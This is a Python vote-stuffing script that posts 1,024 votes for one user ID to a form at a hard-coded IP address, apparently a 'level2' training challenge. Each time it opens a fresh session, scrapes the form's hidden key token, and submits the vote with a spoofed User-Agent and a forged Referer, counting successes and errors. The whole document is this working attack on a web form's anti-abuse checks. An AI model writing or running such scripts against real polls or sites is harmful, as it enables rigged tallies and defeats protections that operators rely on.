#!/usr/bin/python3
import requests
from bs4 import BeautifulSoup
import json

user_id = 3344
votes = 1024
url = 'http://158.69.76.135/level2.php'
success_votes = 0
error_votes = 0
# Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36
header = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)\
                AppleWebKit/537.36 (KHTML, like Gecko)\
                Chrome/91.0.4501.0 Safari/537.36 Edg/91.0.866.0',
        'Referer': url
}
for i in range(0, votes):
    cookies_page = requests.session()
    r = cookies_page.get(url)
    print(r.cookies)

    soup = BeautifulSoup(r.text, 'html')
    key_value = soup.find('form').find('input', {'name': 'key'})['value']
    print(key_value)

    votation = {'id': user_id, 'holdthedoor': 'Submit', 'key': key_value}
    vote = cookies_page.post(url, headers=header, data=votation)
    print(vote.cookies)

    if vote.status_code == 200:
        success_votes += 1
        print("success: {}".format(success_votes))
    else:
        error_votes += 1
        print("errors: {}".format(error_votes))
